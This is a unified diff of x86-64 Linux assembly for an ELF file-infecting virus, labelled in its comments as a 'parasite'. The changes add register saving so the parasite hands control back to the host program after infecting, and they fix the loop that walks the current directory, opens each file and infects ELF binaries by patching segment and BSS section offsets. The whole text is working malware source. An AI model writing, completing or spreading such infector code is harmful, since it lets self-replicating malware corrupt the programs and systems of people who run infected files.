@@ -1,44 +1,46 @@
-; #define AT_FDCWD		-100	/* Special value used to indicate
-;								openat should use the current
-;								working directory. */
-; kernel call 257
-; int openat(int dirfd, const char *pathname, int flags);
-;	returns fd, -1 error
-;______________________________________________________________________________
-; kernel call 5
-; int fstat(int fd, struct stat *statbuf);
-;	return 0 if succes, -1 error
-;______________________________________________________________________________
-; kernel call 217, 78 for 32 bits version
-; int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-;	returns number of bytes read, -1 error
-;	struct linux_dirent64 {
-;		ino64_t        d_ino;    /* 64-bit inode number */ 64bits = 8 bytes
-;		off64_t        d_off;    /* 64-bit offset to next structure */ 8 bytes
-;		unsigned short d_reclen; /* Size of this dirent */ 2 bytes
-;		unsigned char  d_type;   /* File type */ 1 bytes
-;		----------- D_NAME START 19 BYTES FROM START --------------------
-;		char           d_name[]; /* Filename (null-terminated) */
-;};
-;______________________________________________________________________________
-; kernel call 3
-; int close(int fd);
-;	osef
-
-
 section .text
 	global _start
 
 _start:
 _parasiteStart:
+	; # SAVE REGS
+	push rax
+	push rbx
+	push rcx
+	push rdx
+	push rsi
+	push rdi
+	push r8
+	push r9
+	push r10
+	push r11
+	push r12
+	push r13
+	push r14
+	push r15
+
 	; # BEGIN OF PARASITE CODE, MAIN FUNC
 	push 0x2E ; FOLDER TO PARSE '.'
 	lea rdi, [rsp] ; GET POINTER STACK ADDRESS FOR OUR PATHNAME
-	call search
-	;call _code
-	mov rax, 60
-	mov rdi, 0
-	syscall
+	call search ; PARSE AND INFECT FILES IN FOLDER '.'
+	add rsp, 8 ; POP OUR FOLDER NAME IN OBLIVION
+
+	; # RESTORE REGS
+	pop r15
+	pop r14
+	pop r13
+	pop r12
+	pop r11
+	pop r10
+	pop r9
+	pop r8
+	pop rdi
+	pop rsi
+	pop rdx
+	pop rcx
+	pop rbx
+	pop rax
+	call _code
 	ret
 
 set_mark:
@@ -301,10 +303,10 @@ _segIterate:
 _secLoopFirstCheck:
 	cmp byte[rsp+r8+4], 8 ; CHECK IF Shdr->sh_type == SHT_NOBITS
 	jne _secLoopSndCheck
-	mov r11, 0x01
+	mov r14, 0x01
 	; # FOUND BSS SECTION
 _secLoopSndCheck:
-	cmp r11, 0x01
+	cmp r14, 0x01
 	jne _secIterate
 	; # BSS SECTION HAS BEEN FOUND, MUST INCREMENT THIS SECTION OFFSET CODELEN+BSS
 	; # INCREMENTING sh_addr & offset by codelen + bss size
@@ -473,7 +475,7 @@ open_file:
 	syscall
 	; # ANALYSE FILE
 	cmp rax, 0 ; CHECK IF FD > 0
-	jb _openEnd ; IF < 0 RET
+	jl _openEnd ; IF < 0 RET
 	push rax
 	mov r9, rax ; KEEP OUR FD IN R9 REG
 	call analyse
@@ -527,8 +529,8 @@ search:
 	; START OF STRUCT STACK
 	mov rdi, rsp ; THE START OF OUR RET STRUCT STORED IN RDI
 	; END OF STRUCT STACK
-	mov rsi, rsp ; STOCK RSP IN RDI SO I CAN ADD GETDENTS RET TO DETERMINE THE SIZE
-	add rsi, rax ; THE END OF OUR RET STRUCT STORED IN RSI
+	mov r10, rax ; WE USE R10 AS OUR BUF LIMIT
+	mov r8, 0 ; WE INITIALIZE OUR COUNTER IN R8
 
 parse_dir:
 	; ### VALUES ###
@@ -545,15 +547,20 @@ parse_dir:
 	push rsi
 	push rcx
 	push rdx
-	call open_file
+	push r8
+	push r10
+	call open_file ; OPEN FOUND FILE FOR ANALYZE/INFECT IF POSSIBLE
+	pop r10
+	pop r8
 	pop rdx
 	pop rcx
 	pop rsi
 	pop rdi
 	; LOOP INSTRUCTIONS
-	add rdi, rcx ; MOVING OUR CURRENT STRUCT TO THE NEXT ONE BY ADDING RECLEN
-	cmp qword[rdx - 8], 0x00 ; CHECK IF OFFSET TO NEXT STRUCT IS NULL
-	jne parse_dir ; IF NOT NULL KEEP LOOPING
+	add di, cx ; MOVING OUR CURRENT STRUCT TO THE NEXT ONE BY ADDING RECLEN
+	add r8w, cx ; ADD D_RECLEN TO OUR COUNTER
+	cmp r8, r10 ; CHECK IF WE WENT FURTHER THAN OUR GETDENTS RET
+	jl parse_dir ; IF NOT, KEEP LOOPING
 	; #########
 
 _parseEnd:
